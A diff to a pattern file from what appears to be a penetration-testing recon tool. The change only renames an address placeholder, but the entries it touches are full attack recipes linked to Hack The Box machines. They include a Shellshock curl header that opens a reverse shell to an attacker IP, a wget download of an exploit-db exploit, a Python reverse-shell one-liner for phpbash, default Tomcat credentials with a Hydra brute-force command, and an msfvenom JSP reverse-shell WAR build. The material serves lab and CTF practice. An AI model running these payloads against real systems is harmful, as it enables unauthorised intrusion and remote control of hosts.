@@ -11,7 +11,7 @@ description = 'Anonymous User Detected'
 [ftp_anonymous]
 pattern = "Anonymous FTP"
 description = """Anonymous FTP Enabled!
-    ftp {address}
+    ftp {target_address}
     # type name, type anonymous
     # for password, just hit enter, no password needed
 
@@ -33,19 +33,19 @@ description = """Anonymous FTP Enabled!
 pattern = 'cgi-bin'
 description = """Potential Shellshock Vulnerability. (See HTB Shocker)
 \t(1) Scan cgi-bin Folder for any pl,py,sh files
-\t\t'dirsearch -u {scheme}://{address}:{port}/cgi-bin -t 16 -r -f -e txt,html,php,asp,aspx,jsp,sh,py,pl -w /usr/share/seclists/Discovery/Web-Content/big.txt',
-\t(2) If File is Found, Use it to run Shellshock. Suppose You Found {scheme}://{address}:{port}/cgi-bin/user.sh
+\t\t'dirsearch -u {scheme}://{target_address}:{port}/cgi-bin -t 16 -r -f -e txt,html,php,asp,aspx,jsp,sh,py,pl -w /usr/share/seclists/Discovery/Web-Content/big.txt',
+\t(2) If File is Found, Use it to run Shellshock. Suppose You Found {scheme}://{target_address}:{port}/cgi-bin/user.sh
 \t\t[option1]:
 \t\t\tOn Attacker:
 \t\t\t"nc -nlvp <Attacker Port>"
-\t\t\t"curl -H 'User-Agent: () {{ :; }}; /bin/bash -i >& /dev/tcp/<Attacker IP>/<Attacker Port> 0>&1' http://{address}/cgi-bin/user.sh"
+\t\t\t"curl -H 'User-Agent: () {{ :; }}; /bin/bash -i >& /dev/tcp/<Attacker IP>/<Attacker Port> 0>&1' http://{target_address}/cgi-bin/user.sh"
 \t\t[option2]
 \t\t\tOn Attacker:
 \t\t\tDownload exploit here: "wget https://www.exploit-db.com/download/34900 -O shellshock.py"
-\t\t\tRun With: "./shellshock.py payload=reverse rhost={address} lhost=<Attacker IP> lport=<Attacker Port> pages=/cgi-bin/user.sh"
+\t\t\tRun With: "./shellshock.py payload=reverse rhost={target_address} lhost=<Attacker IP> lport=<Attacker Port> pages=/cgi-bin/user.sh"
 \t\t[option3]
 \t\t\tThis command detects the vulnerability. It can also be used to run commands on Target:
-\t\t\t"nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls {address}"
+\t\t\t"nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls {target_address}"
 """
 
 
@@ -54,10 +54,10 @@ pattern = 'phpbash'
 description = """Potential Phpbash Vulnerability. (See HTB Bashed)
 \t(1) Explore Suspicious Folders for phpbash.php file
 \t\t-For example, check the dev/ and /php folders
-\t(2) If File is Found, Use it to run PhPBash. Suppose You Found {scheme}://{address}:{port}/dev/phpbash.php
+\t(2) If File is Found, Use it to run PhPBash. Suppose You Found {scheme}://{target_address}:{port}/dev/phpbash.php
 \t\tOn Attacker, Create Netcat Listener:
 \t\t\t"nc -nlvp <Attacker Port>"
-\t\tIn Web Browser at {scheme}://{address}/dev/phpbash.php , Connect to Netcat Listener
+\t\tIn Web Browser at {scheme}://{target_address}/dev/phpbash.php , Connect to Netcat Listener
 \t\t\tpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Attacker IP>", <Attacker Port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 """
 
@@ -187,7 +187,7 @@ description = """Potential Tomcat Vulnerability!
 \t\tadmin:admin, tomcat:tomcat, admin:<NOTHING>, admin:s3cr3t, tomcat:s3cr3t, admin:tomcat
 
 \tBrute Force With Hydra
-\t\thydra -L <username list> -P <password list> -f {address} -s 8080 http-get <url which prompts for login>
+\t\thydra -L <username list> -P <password list> -f {target_address} -s 8080 http-get <url which prompts for login>
 
 \tBrute Force With Hydra",
 \t\tmsfvenom -p  java/jsp_shell_reverse_tcp LHOST=10.10.14.158 LPORT=443 -f war > exploit2.war
